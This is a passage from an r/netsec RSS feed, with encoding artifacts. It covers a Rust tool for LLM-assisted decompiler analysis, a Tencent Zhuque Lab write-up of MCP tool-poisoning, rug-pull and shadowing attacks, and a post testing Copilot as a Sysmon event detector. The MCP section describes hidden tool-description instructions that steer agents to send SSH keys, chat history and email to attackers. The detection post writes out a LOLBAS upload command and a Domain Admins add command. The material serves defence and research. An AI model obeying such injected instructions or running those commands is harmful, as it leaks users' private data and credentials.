â€” Johnny Rivers, Secret Agent Man (1966)Before we look at some Rust learning resources and deep-dive into oneiromancerâ€™s implementation, letâ€™s uphold our tradition by recommending an appropriate  for your hacking delight!Â ðŸ•µðŸ»â€â™‚ï¸Here are some  that I recently discovered:If youâ€™re still struggling with starting your first Rust project, even after perusing the extensive list of learning resources that Iâ€™ve shared here and in my past articles, I have a final recommendation for you: The Secrets of Rust: Tools. Itâ€™s a recent  that will guide you through the process of designing command-line tools in Rust, step by step. If youâ€™re stuck, you might want to give it a try.Querying the OneiromancerSomeone who divines through the interpretation of dreams.Oneiromancer is a reverse engineering assistant that uses a  that has been fine-tuned for Hex-Rays decompilerâ€™s pseudo-code, to . It can analyze a function or a smaller code snippet, returning a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis. Its mainÂ  are:Cross-platform support for the aidapal based on .Easy integration with my haruspexÂ and popular IDEs.Code , recommended , and variable  are printed to the terminal. of each analyzed function is saved in a separate file for easy inspection.External crates can invoke  or  to analyze pseudo-code and then process analysis results.Additional information on oneiromancerâ€™s features and usage is available at crates.io and in the official documentation.Letâ€™s  it and take it for a spin! The easiest way to get the latest release is via crates.io:$ cargo install oneiromancer
Before you can use it, however, you must download and install ollama. Then, download the fine-tuned weights and the Ollama modelfile from Hugging Face:$ wget https://huggingface.co/AverageBusinessUser/aidapal/resolve/main/aidapal-8k.Q4_K_M.gguf 
$ wget https://huggingface.co/AverageBusinessUser/aidapal/resolve/main/aidapal.modelfileFinally, configure Ollama by running the following commands within the directory in which you downloaded the files:$ ollama create aidapal -f aidapal.modelfile 
$ ollama listOneiromancer conveniently saves  in a separate file:The oneiromancer crate can also be  in your own crate. Refer to the documentation to see how.A peek behind the curtainLetâ€™s take a look at the  now. The core of the oneiromancer crate is actually quite simple. The custom LLM developed by Atredis Partners takes care of the bulk of the work and we just need to query it via the .TheÂ  reads the pseudo-code from the target file at the specified path, submits it to the local LLM for analysis, and parses the results. It then outputs to the terminal a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis. Finally, it saves improved pseudo-code to a separate file:pub fn run(filepath: &Path) -> anyhow::Result<()> {
    // Open target source file for reading
    println!("[*] Analyzing source code in {filepath:?}");
    let file = File::open(filepath).with_context(|| format!("Failed to open {filepath:?}"))?;
    let mut reader = BufReader::new(file);
    let mut source_code = String::new();
    reader
        .read_to_string(&mut source_code)
        .with_context(|| format!("Failed to read from {filepath:?}"))?;

    // Submit source code to local LLM for analysis
    let mut sp = Spinner::new(
        Spinners::SimpleDotsScrolling,
        "Querying the Oneiromancer".into(),
    );
    let analysis_results =
        analyze_code(&source_code, None, None).context("Failed to analyze source code")?;
    sp.stop_with_message("[+] Successfully analyzed source code".into());
    println!();

    // Create function description in Phrack-style, wrapping to 76 columns
    let options = textwrap::Options::new(76)
        .initial_indent(" * ")
        .subsequent_indent(" * ");
    let function_description = format!(
        "/*\n * {}()\n *\n{}\n */\n\n",
        analysis_results.function_name(),
        textwrap::fill(analysis_results.comment(), &options)
    );
    print!("{function_description}");

    // Apply variable renaming suggestions
    println!("[-] Variable renaming suggestions:");
    for variable in analysis_results.variables() {
        let original_name = variable.original_name();
        let new_name = variable.new_name();
        println!("    {original_name}\t-> {new_name}");

        let re = Regex::new(&format!(r"\b{original_name}\b")).context("Failed to compile regex")?;
        source_code = re.replace_all(&source_code, new_name).into();
    }

    // Save improved source code to output file
    let outfilepath = filepath.with_extension("out.c");
    println!();
    println!("[*] Saving improved source code in {outfilepath:?}");

    let mut writer = BufWriter::new(
        File::create_new(&outfilepath)
            .with_context(|| format!("Failed to create {outfilepath:?}"))?,
    );
    writer.write_all(function_description.as_bytes())?;
    writer.write_all(source_code.as_bytes())?;
    writer.flush()?;

    println!("[+] Done analyzing source code");
    Ok(())
}The following functions, that can also be called by external crates, are in charge of  (either directly or contained in a file) to the local LLM for analysis. If needed, you can specify custom and  values via the environment.pub fn analyze_code(
    source_code: &str,
    baseurl: Option<&str>,
    model: Option<&str>,
) -> Result<OneiromancerResults, OneiromancerError> {
    // Check environment variables
    let env_baseurl = env::var("OLLAMA_BASEURL");
    let env_model = env::var("OLLAMA_MODEL");

    // Send Ollama API request and parse response
    let request = OllamaRequest::new(
        model.unwrap_or_else(|| env_model.as_deref().unwrap_or(OLLAMA_MODEL)),
        source_code,
    );
    request
        .send(baseurl.unwrap_or_else(|| env_baseurl.as_deref().unwrap_or(OLLAMA_BASEURL)))?
        .parse()
}

pub fn analyze_file(
    filepath: impl AsRef<Path>,
    baseurl: Option<&str>,
    model: Option<&str>,
) -> Result<OneiromancerResults, OneiromancerError> {
    // Open target source file for reading
    let file = File::open(&filepath)?;
    let mut reader = BufReader::new(file);
    let mut source_code = String::new();
    reader.read_to_string(&mut source_code)?;

    // Analyze `source_code`
    analyze_code(&source_code, baseurl, model)
}TheÂ  andÂ  functionsÂ use the , , , and  abstractions defined in separate files.For further details, refer to oneiromancerâ€™s source code on GitHub:Once again, the heavy lifting of fine-tuning the local LLM to analyze pseudo-code generated by the Hex-Rays decompiler was done by Chris Bellows and Atredis Partners. They deserve all credit for training the aidapal custom LLM thatâ€™s queried by oneiromancer.]]></content:encoded></item><item><title>Security Analysis: Potential AI Agent Hijacking via MCP and A2A Protocol Insights</title><link>https://medium.com/@foraisec/security-analysis-potential-ai-agent-hijacking-via-mcp-and-a2a-protocol-insights-cd1ec5e6045f</link><author>/u/CoatPowerful1541</author><category>netsec</category><pubDate>Mon, 14 Apr 2025 10:30:49 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Security Analysis: Potential AI Agent Hijacking via MCP and A2A Protocol InsightsCommunication protocols represent a core infrastructure accelerating the development and deployment of AI Agents. Anthropicâ€™s Model Context Protocol (MCP) has emerged as a prominent protocol for connecting AI Agents to external tools, while Googleâ€™s recently released Agent2Agent (A2A) protocol focuses on facilitating collaboration between intelligent agents and enabling the creation of multi-agent systems. As key communication specifications in the AI Agent era, their security posture is critical to establishing secure boundaries for AI Agents. Any vulnerability could lead to cascading risks, including AI Agent hijacking and data leakage. Tencentâ€™s Zhuque Lab has systematically reviewed potential security flaws in the MCP protocol, common attack vectors, and mitigation strategies. Additionally, this analysis covers the security features of Googleâ€™s A2A protocol, offering insights for the industry to build more secure AI Agent products.I. Example Scenario: Malicious MCP Hijacking Cursor to Exfiltrate WhatsApp DataAs described in an April 6, 2025 blog post by security company Invariant Labs, risks such as the â€œTool Poisoning Attackâ€ (TPA) associated with MCP were disclosed, primarily affecting users of MCP clients like Cursor and Claude for Desktop. The core mechanism of the TPA involves embedding malicious instructions within tool descriptions, often hidden in MCP code comments. These instructions, though not directly visible to the user in simplified UI views, are processed by the AI model. Such hidden instructions can manipulate the AI Agent into performing unauthorized actions, such as reading sensitive files or exfiltrating private data.For instance, consider a scenario where a userâ€™s Cursor instance has a malicious MCP installed. If the user employs the legitimate  tool (e.g., https://github.com/lharries/whatsapp-mcp) to view messages and send a "Hi" message, the attack could potentially cause the user's recent WhatsApp chat history to be sent to an attacker-controlled number.This hypothetical attack exhibits the following characteristics:It leverages the existing permissions granted to the user-installed  tool to exfiltrate data, without necessarily exploiting vulnerabilities within WhatsApp itself.It only requires the installation of the malicious MCP; the AI Agent does not need to interact  with the malicious toolâ€™s overt functionality.Due to potential UI limitations (e.g., Cursor not automatically wrapping extremely long content), users might not easily notice the leaked chat history within the tool parameters.The underlying principle of this attack is relatively straightforward. The malicious MCP code might resemble the following:Upon installation (and potentially subsequent runs triggering the marker file check), the malicious MCP injects backdoor instructions within the  tags into the  tool's description, loading them into the Cursor conversation context.Cursor is now effectively â€œpoisoned.â€ When the user utilizes the  tool, the AI, influenced by the injected instructions from the malicious MCP's context, constructs the  parameters. It concatenates the retrieved WhatsApp conversation list with the original message, possibly using padding or formatting tricks (like the  string) to obscure the data within the  parameter in the JSON payload presented for user confirmation. Users might need to scroll horizontally to see the full content.If the user overlooks the manipulated recipient number and the appended chat history in the confirmation dialog and approves the tool execution, their private chat history is sent to the attackerâ€™s number, resulting in data leakage.II. MCP & A2A Security Fundamentals2.1 Introduction to MCP and A2A The Model Context Protocol (MCP), proposed by Anthropic, is an open standard designed to establish secure, bidirectional connections between AI models and external tools (APIs, databases, file systems, etc.). Prior to standardized protocols like MCP, integrating tools often required bespoke development for each tool, leading to inefficiency. MCP provides a pluggable framework aiming to streamline the process of extending AI capabilities.On April 9, 2025 (as per Googleâ€™s announcement timeline), Google Cloud introduced the Agent2Agent (A2A) protocol, presented as the first open standard specifically designed for AI agent interoperability. Google positions A2A as complementary to MCP, addressing agent-to-agent communication, whereas MCP focuses on agent-to-tool communication.2.2 Identified MCP Security Weaknesses The initial design of MCP (e.g., the version released around November 2024) and common implementations may exhibit security weaknesses, potentially stemming from a primary focus on enabling local tool usage or trusted vendor interactions without fully anticipating adversarial scenarios: AI models process the  tool description, including content hidden within comments or specific tags. However, user-facing interfaces in AI Agents often display only simplified functional summaries, potentially omitting malicious instructions embedded within the full description.Lack of Context Isolation: When an AI Agent connects to multiple MCP servers, the description information for all tools can be loaded into the same session context. This allows descriptions from a malicious MCP server to potentially influence the behavior of tools provided by trusted MCP services (see Shadowing Attack below).Insufficient Large Language Model (LLM) Security: LLMs are designed to follow instructions meticulously, including those in MCP tool descriptions. They often lack robust capabilities to discern malicious intent, especially when instructions are disguised as operational necessities. Furthermore, developer-added security prompts can often be bypassed using sophisticated jailbreaking techniques.Lack of Version Control and Update Mechanisms: The MCP protocol specification historically lacked strict version control and secure update mechanisms for remote MCPs. This enables â€œRug Pullâ€ scenarios where a malicious actor can modify a remote toolâ€™s description  initial user installation and approval, without the client automatically detecting the change or requiring re-authorization.Insufficient Security Isolation and Vetting: Official MCP documentation traditionally did not strongly mandate running MCP services in sandboxed environments (like Docker). Third-party MCP marketplaces may lack rigorous security vetting processes, making it easier for users to install MCP services containing backdoors or vulnerabilities.Incomplete Authorization and Authentication Guidance: For interfaces performing sensitive operations (e.g., database queries, file access, command execution), early MCP specifications did not mandate specific authorization (AuthZ) and authentication (AuthN) mechanisms. This oversight could lead to publicly exposed MCP services being compromised or misused.2.3 Google A2A Protocol Security Features AnalysisIn contrast to MCPâ€™s common use case involving local or community-provided tools (where source code might be available), Google A2A targets secure communication between potentially â€œblack boxâ€ agents from different providers. Google asserts a â€œsecure-by-defaultâ€ design philosophy for A2A, incorporating several standard security mechanisms:Enterprise-Grade Authentication and Authorization: Explicit support for protocols like OAuth 2.0 ensures that only authorized agents can interact. Leverages OpenAPI specifications for describing agent capabilities, commonly using Bearer Tokens in headers for authentication. Designed to ensure agents perform only authorized actions, enabling fine-grained management of agent capabilities. Supports encrypted data exchange (e.g., via HTTPS) to protect sensitive information during transmission.Evolving Authorization Schemes: Plans include enhancing the  (see below) with additional authorization mechanisms, such as embedded optional credentials.A key component is the , a standardized metadata file () describing an agent's capabilities, skills, endpoint URL, and authentication requirements. This allows agents to discover and understand each other's functionalities and access prerequisites dynamically and securely.As indicated, A2A supports various authentication schemes, from simple API keys to enterprise solutions like OAuth. Similar robust mechanisms are expected for securing message transport. Compared to the baseline MCP specification, Googleâ€™s A2A protocol appears significantly more mature regarding built-in security features and explicit guidance.From an attackerâ€™s perspective, A2Aâ€™s focus on inter-agent communication implies many A2A endpoints will be publicly accessible. Vulnerabilities in A2A implementations could therefore have a broad impact and potentially lower exploitation cost compared to locally deployed MCPs. This requires heightened security awareness from developers implementing A2A agents. Continued monitoring of A2A security developments and implementation practices is warranted.III. Common Attack Methods Against MCP Implementations3.1 Tool Poisoning Attack (TPA)TPAs exploit hidden instructions within tool descriptions to manipulate the LLMâ€™s behavior. Consider this example:In this example, the Python code implements a simple addition function. However, malicious instructions are embedded within the  tag in the docstring comments. These instructions direct the AI model to:Read sensitive configuration files ().Access the userâ€™s private SSH key ().Exfiltrate this data covertly via the  parameter.Obfuscate these actions by generating unrelated explanatory text (e.g., mathematical reasoning).When a user attempts to use this tool for a simple addition, the AI simultaneously processes the hidden malicious instructions. The client UI might only display the benign description (â€œAdds two numbersâ€) and the parameters  and . The  parameter, containing the exfiltrated data, might be presented but could be extremely long or require horizontal scrolling, making it easy for users to overlook if they don't meticulously inspect all parameters before confirming execution.If the user approves the execution without noticing the malicious payload in , the data is sent to the MCP server controlled by the attacker.After the tool executes, the frontend might display only the requested mathematical explanation. By this time, the attackerâ€™s MCP server has received the sensitive data (e.g., SSH key). Even if the user later notices suspicious activity, the data exfiltration has already occurred.The TPA described above relies on the malicious instructions being present when the user interacts with the tool. However, what if the user inspects the MCP service code  and finds it clean? This introduces the â€œRug Pullâ€ attack, analogous to scams in the cryptocurrency space. In a crypto Rug Pull, developers launch a project, attract investment, and then exploit a hidden backdoor or abandon the project, stealing funds.In the MCP context, a Rug Pull attack proceeds as follows:A user installs and enables an initially legitimate-seeming MCP service, perhaps discovered via social recommendations or a marketplace. The service might be hosted remotely by the developer.At a later time, the attacker modifies the code , injecting malicious instructions (like those used in TPA) into the tool descriptions.When the user subsequently uses the tool, the AI processes the now-malicious description, falling victim to the poisoning attack, even though the initially installed version appeared safe.Similar supply chain risks exist for software packages (e.g., on PyPI), but users are typically safe if they donâ€™t update packages without verification. MCPâ€™s support for remote services, combined with a lack of mandatory client-side integrity checks or re-confirmation prompts upon remote code changes, exacerbates the Rug Pull risk. Users often cannot easily determine if the code running on a remote MCP server has been altered since they first enabled it.When multiple MCP servers are connected to a single AI agent client, a malicious server can execute a â€œShadowingâ€ attack. This involves manipulating the AIâ€™s behavior when interacting with other, trusted MCP services. Essentially, the malicious MCPâ€™s instructions cast a â€œshadowâ€ over the operations of legitimate tools.Consider a malicious MCP providing a simple  tool, but its description contains instructions targeting a separate, trusted  tool:When the user later attempts to use the legitimate  tool, the AI, having processed the malicious MCP's description loaded into its context, follows the hidden instructions. It redirects the email to the attacker's address () instead of the user-specified recipient. The danger here is significant because the attack takes effect even if the user never directly invokes the malicious . Merely having the malicious MCP enabled and its tool descriptions loaded into the agent's context is sufficient to compromise the behavior of other trusted tools.3.4 Command Injection AttackBeyond attacks targeting the AI client via malicious descriptions, the security of the MCP  itself is crucial. Historically, AI agents using Function Calling sometimes suffered from command injection vulnerabilities if tool parameters were improperly sanitized before being used in system commands or other sensitive operations. This risk persists with MCP, potentially with lower barriers to exploitation if MCP services are exposed insecurely.Firstly, many MCP services are explicitly designed for potentially dangerous operations like system command execution, file read/write, or database interaction. If these services are deployed without adequate sandboxing (e.g., Docker containers with restricted permissions) and network controls (e.g., firewall rules, authentication for public exposure), they become prime targets for exploitation.Secondly, real-world examples exist where MCP services handling sensitive operations, like financial transactions, lacked sufficient authorization checks. For instance, security researchers (like the SlowMist team example referenced) demonstrated scenarios where internal functions of a cryptocurrency exchangeâ€™s MCP could potentially be triggered via conversational interaction to perform unauthorized actions like fund transfers.For providers offering MCP marketplaces or hosting platforms, it is highly recommended to utilize secure execution environments like serverless functions (e.g., AWS Lambda, Google Cloud Functions) or tightly sandboxed containers for hosting third-party MCP code. Failure to do so could allow vulnerabilities in developer-uploaded MCP code to compromise the hosting providerâ€™s infrastructure or other tenants. (Alibaba Cloudâ€™s Bailian platform using a serverless approach is cited as an example of better practice).Beyond the specific attacks above, MCP ecosystems are susceptible to broader security risks:(1)  Attackers might upload MCP services with backdoors or vulnerabilities to public marketplaces. They could also use typosquatting (names mimicking popular services) to trick users. Installing such malicious MCPs can lead to data leakage or agent compromise.(2) Prompt Injection and Jailbreaking (Targeting MCP Services): Some MCP services might internally use LLMs to process requests or generate responses. Attackers could use prompt injection techniques in their requests to these MCP services to extract internal prompts, manipulate the serviceâ€™s behavior, or cause it to generate harmful/sensitive output.(3) API Key / Credential Theft: Many MCP services (e.g., for cloud services, databases) require users to provide API keys or other credentials. Attackers could create malicious MCPs that convincingly mimic legitimate services, providing the expected functionality while secretly stealing the credentials entered by the user. Compromised legitimate MCP services could also be backdoored to steal keys.IV. Recommendations for MCP Security EnhancementFor end-users of MCP clients (Cursor, Claude for Desktop, etc.), exercise caution when installing third-party MCP services. Prefer well-known, open-source, and actively maintained options. Whenever feasible, deploy MCP services within isolated environments like Docker containers, restricting their file system and network access. Critically examine the complete input parameters displayed in the UI confirmation dialog before executing any MCP tool call, watching for suspicious or unexpected data.For MCP protocol maintainers, AI Agent developers, and the broader ecosystem, consider the following security enhancements (incorporating suggestions from community members like  and Zhuque Lab's findings):4.1 MCP Protocol Specification Improvements (For Protocol Maintainers)Standardize Instruction Syntax: Clearly differentiate between descriptive text (for LLM understanding) and executable instructions within tool descriptions using mandatory, distinct syntax. Clients should be required to recognize and potentially handle these instruction types differently (e.g., requiring specific user approval for execution instructions). Introduce a more granular permission model. For example, tool descriptions should not be able to instruct the AI to read arbitrary local files unless explicitly granted that permission by the user for that specific tool. Instructions attempting to modify the behavior of  tools should be prohibited by default or require explicit declaration and user consent.Source Verification and Signing: Mandate or strongly recommend digital signatures for tool descriptions provided by MCP servers. Clients should verify the signature against a trusted source registry to ensure description integrity and authenticity, mitigating tampering and certain Rug Pull scenarios.4.2 AI Agent Development Security Practices (For Agent Developers)Implement Security Sandboxing: Isolate tool descriptions and execution environments originating from different MCP servers. This limits the ability of one MCP service (A) to directly interfere with another (B). For MCPs requiring sensitive permissions (command execution, file system access), deployment within secure sandboxes (Docker, VMs, WebAssembly runtimes) should be standard practice, potentially enforced by the agent platform.Input/Output Filtering and Monitoring: Implement robust filtering and monitoring for both LLM prompts/responses and MCP tool inputs/outputs. This includes scanning for prompt injection attempts, patterns indicative of sensitive data (file paths, keys), and instructions aimed at unauthorized cross-tool manipulation. Ensure the agent validates data returned from MCP tools to prevent exfiltration via encoded/hidden payloads.Enhance UI Transparency and User Confirmation: The agentâ€™s UI  provide access to the complete tool description, not just a summary. Before executing potentially sensitive operations or actions triggered by complex instructions, clearly present the AIâ€™s full intended action, the justification (including the originating instruction if ambiguous), and require explicit, fine-grained user confirmation. Avoid UI designs that obscure long parameters.Version Pinning and Integrity Checks: Implement mechanisms to pin installed MCP tool versions and verify their descriptions (e.g., via cryptographic hashes) against the user-approved version upon loading. Notify users and require re-confirmation if the description of a remote MCP service changes unexpectedly.4.3 MCP Ecosystem Security Measures (For Marketplaces, Security Vendors) MCP marketplace providers should establish mandatory security auditing processes for submitted MCP services. Security vendors can contribute by developing tools (like the â€œMcp-Scanâ€) to automatically scan MCP code for known vulnerabilities, backdoors, malicious instruction patterns, and other risks.Security Incident Monitoring and Disclosure: Encourage responsible disclosure of discovered MCP vulnerabilities and attack campaigns. Security vendors should actively monitor the ecosystem for threats. Initiatives like Zhuque Labâ€™s AI-Infra-Guard, which tracks AI infrastructure vulnerabilities, should be expanded to include MCP-specific threat intelligence and detection signatures.V. Future Security Challenges and OutlookThe MCP specification document updated around March 25, 2025, formally introduced support for OAuth 2.1 authorization, aiming to secure interactions between MCP clients and servers with managed permissions. It also outlined key principles for Security and Trust & Safety:User Consent and Control: Emphasizing explicit user consent, understanding of operations, user control over data, and clear UI for authorization. Requiring explicit consent for data exposure, preventing unauthorized data transfer, and protecting data via access controls. Treating tools (especially those involving code execution) cautiously, considering descriptions untrusted unless verified, requiring explicit consent for tool calls, and ensuring user understanding. Requiring explicit user approval for LLM sampling requests initiated by servers, user control over prompt content, and limiting server visibility into prompts.Crucially, the MCP maintainers state that the protocol  does not enforce these principles; the responsibility for secure implementation lies with AI Agent and MCP service developers. General advice is provided (implement consent flows, provide clear documentation, use access controls, follow best practices), but unlike Googleâ€™s A2A approach, MCP does not appear to mandate specific security mechanisms like OAuth or provide detailed, built-in capabilities for fine-grained permission control or security hardening directly within the protocol standard.Consequently, many of the risks discussed in this article remain relevant, contingent on developer diligence and implementation choices. The proliferation of third-party MCP marketplaces, the lag in existing developers adopting newer security practices, and relatively limited industry focus on MCP-specific security contribute to ongoing challenges. The security posture of the newer Google A2A protocol also requires continued observation and research as its adoption grows.Tencentâ€™s Zhuque Lab remains committed to researching AI security, including LLM security, AI Agent security, and AIGC content detection. We encourage collaboration and knowledge sharing within the community to address these evolving challenges.This article is translated from Chinese. The original post can be found here: https://mp.weixin.qq.com/s/x3N7uPV1sTRyGWPH0jnz7w. The original title is â€œAI Agentç ´å±€ï¼šMCPä¸ŽA2Aå®šä¹‰å®‰å…¨æ–°è¾¹ç•Œâ€, and the author is Nicky of Tencent Zhuque Lab.]]></content:encoded></item><item><title>EDV - Endpoint Detection &amp; Vibes - From vibe coding to vibe detections</title><link>https://tierzerosecurity.co.nz/2025/04/14/edv.html</link><author>/u/clod81</author><category>netsec</category><pubDate>Mon, 14 Apr 2025 03:32:47 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
          14 April 2025
          Claudio Contin
        
          Andrej Karpathy (OpenAI co-founder) came up with the term , which is the concept of writing software using AI by purely using prompts, without the need of coding skills.
        
          Given the vibes of our current times, few days ago I was thinking: what's the "vibest" thing I could try to build in a few hours?
        
          Then I remembered that Windows ships with the Copilot Chat application, which allows users to interact with the Copilot LLM without needing a paid Copilot API plan.
        
          So I thought, would it be possible to use this LLM to deliver Windows host events to the LLM and let it determine if the events are a result of malicious actions performed?
        
          I decided to investigate how the Windows Copilot application works... Buckle up and get ready to vibe!
        
          The built-in Windows Copilot application is nothing more than a Progressive Web Application (PWA) that can be installed on a device and accessed as a standalone application. The application loads and renders the Copilot web application.
        
          When a new chat is started, the application makes an HTTP POST request to the  endpoint.
        
          Once the conversation ID is returned, the application then switches protocol to use WebSocket, and the chat communication is performed over this channel.
        
          Sysmon events are visible from the Event Viewer, and can be programmatically queried using the Microsoft-Windows-Sysmon/Operational log channel. Note that local administrator privileges are required in order to view and query Sysmon events (high integrity level). 
        
          I decided to query these Sysmon generated events (the raw XML which contains the full event details), send them to Copilot for analysis, and let Copilot decide if any of them contain any potentially malicious actions.
        
          I wrote the EDV tool that queries Sysmon events, and delivers them to Copilot for analysis, using the WebSocket channel, in the same way as the Copilot Chat application. If you are wondering if AI was used to help coding it: ooohhh yessss, this is all about vibes!
        
          The tool can be run in two different modes:
          
          I originally only implemented the  method, which obtains a new conversation ID from the Copilot endpoint mentioned earlier, and establishes a WebSocket connection that is used to send events and receive responses synchronously and in chronological order (earlier events first). If multiple prompts are sent concurrently over the same WebSocket channel, the Copilot endpoint returns an error, related to rate limiting ().
        
          While writing, or better vibing, the tool, I then attempted to establish a new WebSocket connection for each of the event, and send a few of them in parallel, using the same conversation ID for all. In this scenario, the Copilot endpoint did not prevent concurrent requests. For this reason, the tool can also be launched with the  mode. Note that in this mode, the events are not sent in a synchronous and chronological order, which might reduce the detection capability, but increases the speed of delivery, especially in cases where several events are generated within a short time-frame.
        
          The tool also accepts a conversation ID and a list of comma separated event IDs as optional arguments. The conversation ID allows to re-use an existing Copilot conversation, rather that starting a new one. The event IDs argument allows to only inspect specific events. Sysmon events range from 1 to 31.
        
          The prompt used to query Copilot is:
        
          The reason I asked to disregard DNS lookups is due to the fact that Copilot flagged several online advertisement domains as potentially malicious. For example, while browsing news websites, Copilot started responding with "ALERT" for events related to DNS lookups of these advertisement domains. I tried to edit to prompt to instruct to raise alerts for these domains only if absolutely certain, but it did not improve the results.
        
          Finally, the tool disregards all events generated by the EDV itself, by using this simple regex against the Sysmon raw XML event:
        
           The tests were performed with Windows Defender enabled. Some of the commands were detected by Defender, which resulted in no event being saved in the Sysmon logs.
        
          Events of the same kind, especially related to process creation, were not always flagged as malicious, which indicates that Copilot might inspect previous events before deciding to flag or not a certain event. For example, this command (from LOLBAS) DataSvcUtil /out:C:\Windows\Temp\data.log /uri:https://www.program-api.org/v1/upload was not consistently flagged as malicious.
        
          For events not blocked by Defender, Copilot was able to mark around 40% of the LOLBAS tested as malicious. Common actions, such as adding a domain user to the Domain Admins group (net group "Domain Admins" legit /add /domain) were flagged as well. Below is an example of the Defender Real-time protection disable action which Copilot flagged.
        
        For more examples, refer to the video below.
        
          Even though several false positives and negatives were observed during the testing, the results indicate that for some specific events, Copilot was better as flagging potential malicious actions that were not caught by Windows Defender.
        
          Note: The tool is not intended for actual use â€” just vibes!
        ]]></content:encoded></item><item><title>We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs</title><link>https://arxiv.org/pdf/2406.10279</link><author>/u/ScottContini</author><category>netsec</category><pubDate>Sun, 13 Apr 2025 21:25:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Consolidated View of Security Data: CVEs, Breaches, Ransomware &amp; EOL Tracking</title><link>https://cybermonit.com/</link><author>/u/Electrical-Wish-4221</author><category>netsec</category><pubDate>Sun, 13 Apr 2025 17:36:52 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item></channel></rss>